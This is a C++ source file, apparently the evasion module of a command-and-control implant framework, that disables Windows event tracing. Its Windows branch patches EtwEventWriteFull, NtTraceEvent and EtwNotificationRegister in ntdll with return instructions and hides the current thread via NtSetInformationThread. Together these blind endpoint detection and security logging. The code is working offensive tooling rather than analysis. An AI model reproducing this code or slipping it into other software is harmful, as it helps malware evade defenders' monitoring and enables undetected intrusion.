#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#include <cstring>

namespace rtlc2 { namespace evasion {

// Patch EtwEventWriteFull in ntdll to disable ETW Threat Intelligence
bool PatchEtwTi() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    // Patch EtwEventWriteFull
    void* pFunc = (void*)GetProcAddress(hNtdll, "EtwEventWriteFull");
    if (pFunc) {
        DWORD oldProtect;
        if (VirtualProtect(pFunc, 1, PAGE_READWRITE, &oldProtect)) {
            *(unsigned char*)pFunc = 0xC3; // ret
            VirtualProtect(pFunc, 1, oldProtect, &oldProtect);
        }
    }

    // Also patch NtTraceEvent if present
    void* pNtTrace = (void*)GetProcAddress(hNtdll, "NtTraceEvent");
    if (pNtTrace) {
        DWORD oldProtect;
        if (VirtualProtect(pNtTrace, 1, PAGE_READWRITE, &oldProtect)) {
            *(unsigned char*)pNtTrace = 0xC3;
            VirtualProtect(pNtTrace, 1, oldProtect, &oldProtect);
        }
    }

    return true;
}

// Hide current thread from ETW Threat Intelligence via ThreadHideFromDebugger
bool DisableEtwTiViaThread() {
    typedef LONG (NTAPI* NtSetInfoThread_t)(HANDLE, ULONG, PVOID, ULONG);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    auto NtSetInfoThread = reinterpret_cast<NtSetInfoThread_t>(
        GetProcAddress(hNtdll, "NtSetInformationThread"));
    if (!NtSetInfoThread) return false;

    // ThreadHideFromDebugger = 0x11
    LONG status = NtSetInfoThread(GetCurrentThread(), 0x11, nullptr, 0);
    return status == 0;
}

// Patch EtwNotificationRegister to prevent ETW provider registration
bool PatchEtwNotificationRegister() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    void* pFunc = (void*)GetProcAddress(hNtdll, "EtwNotificationRegister");
    if (!pFunc) return false;

    // Overwrite with: xor eax, eax; ret (return STATUS_SUCCESS)
    unsigned char patch[] = { 0x33, 0xC0, 0xC3 };
    DWORD oldProtect;
    if (!VirtualProtect(pFunc, sizeof(patch), PAGE_READWRITE, &oldProtect))
        return false;

    memcpy(pFunc, patch, sizeof(patch));
    VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);
    return true;
}

// Combined: apply all ETW-TI patches
bool PatchAllEtwTi() {
    bool ok = true;
    ok &= PatchEtwTi();
    ok &= DisableEtwTiViaThread();
    ok &= PatchEtwNotificationRegister();
    return ok;
}

}} // namespace rtlc2::evasion

#else // POSIX

namespace rtlc2 { namespace evasion {
bool PatchEtwTi() { return true; }
bool DisableEtwTiViaThread() { return true; }
bool PatchEtwNotificationRegister() { return true; }
bool PatchAllEtwTi() { return true; }
}} // namespace rtlc2::evasion

#endif
